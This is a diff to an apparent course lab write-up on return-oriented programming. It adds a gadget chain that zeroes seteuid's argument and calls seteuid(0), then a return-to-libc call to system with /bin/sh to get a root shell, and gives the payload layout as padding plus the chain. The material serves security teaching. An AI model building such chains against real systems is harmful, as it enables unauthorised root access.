@@ -157,9 +157,31 @@ The idea here is to call `seteuid(3)` with the argument 0...
 
 This will raise our privledges to root, so when we pop a shell, we will have root permissions.
 
-We can use a combination of these gadgets in this format
+We can use a combination of these gadgets in this format to prepare the call.
+```
+(ret), //just a simple ret
+(xor_eax_eax), //eax = 0
+(pop_ecx), 
+(addr_to_arg1), //ecx = address to seteuid's first argument
+(mov_dwordptr_ecx_eax__pop_ebx), // *ecx = eax
+("JUNK") //since the last gagdet has a `pop ebx`, we need to account for the stack pointer moving up.
+```
 
-chain = ret + xor_eax_eax + pop_ecx + addr_to_arg1 + mov_dwordptr_ecx_eax__pop_ebx + "JUNK" 
+>At the time of this write up, the addr_to_arg1 is 0xbffff21c. 
+
+Now for the actual call to `seteuid(3)`
+```
+&seteuid, //function address to seteuid
+pop_ecx, // we need this to move the stack pointer after "ARG1" for the`system(3)` call.
+"ARG1" //this is argument we give seteuid. This should be 0.
+```
+Now we can use return2libc.
+
+system + exit + bin_sh
+
+Our payload should look like this 
+
+PADDING + ROPCHAIN
 
 ### Exploitation
 
@@ -170,4 +192,7 @@ To pop a shell, run this command.
 You should have a shell!
 
 ### Resources
+Thank you Professor Michalis Polychronakis
+CSE363 Lecture 13(Code Reuse) (https://piazza.com/class_profile/get_resource/k5psogz57l86i5/k8evpwhcfmd5s9)
+
 
